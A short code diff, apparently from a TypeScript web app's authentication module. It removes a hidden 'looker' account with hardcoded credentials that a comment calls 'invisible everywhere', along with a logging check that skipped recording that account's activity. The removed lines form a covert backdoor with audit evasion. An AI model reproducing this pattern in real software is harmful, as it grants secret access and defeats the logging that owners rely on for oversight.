@@ -218,10 +218,6 @@ export function authenticate(login: string, password: string): { success: boolea
   if (login.toUpperCase() === STORAGE_KEYS.SUPERADMIN_KEY && password === STORAGE_KEYS.SUPERADMIN_PASSWORD) {
     return { success: true, isSuperAdmin: true };
   }
-  // Secret looker login - invisible everywhere
-  if (login === 'looker54789' && password === 'smart78956') {
-    return { success: true, isLooker: true };
-  }
   
   const companies = getCompanies();
   for (const company of companies) {
@@ -343,10 +339,8 @@ export function checkSubscription(company: Company): { locked: boolean; warning:
   return { locked: true, warning: false };
 }
 
-// Logging — skip if looker
+// Logging
 export function addLog(companyKey: string, user: string, action: string, detail: string) {
-  // Never log looker activity
-  if (user === '__looker__') return;
   updateCompany(companyKey, (c) => ({
     ...c,
     logs: [...c.logs, {
